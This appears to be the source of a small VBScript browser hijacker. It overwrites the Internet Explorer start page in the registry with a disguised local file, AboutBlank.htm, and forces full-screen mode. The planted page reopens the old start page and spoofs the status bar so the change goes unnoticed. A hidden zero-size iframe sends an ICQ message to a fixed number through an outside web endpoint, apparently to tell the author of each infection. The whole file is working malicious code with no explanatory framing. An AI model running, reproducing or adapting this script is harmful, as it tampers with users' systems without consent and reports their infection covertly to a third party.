Option Explicit
Dim WSHShell, fso, aser
Dim old, win
Dim mody, regNew
Set fso = CreateObject("Scripting.FileSystemObject")
Set WSHShell = CreateObject("WScript.Shell")
win = WSHShell.ExpandEnvironmentStrings("%windir%")
old = WSHShell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page")
mody = win & "\AboutBlank.htm"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", mody 
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FullScreen","yes"
Set aser = fso.CreateTextFile(mody,True)
aser.Write ("<html></head><head><body onLoad=""window.open('"& old &"','_top')"" onMouseOver=""window.status=('about:blank')""><iframe width=0 height=0 src=""http://wwp.icq.com/WWPMsg.dll&method=POST?from=GODWILL&fromemail=&subject=&body=Hax0rd&to=120623862&Send=""></iframe></body></html>")
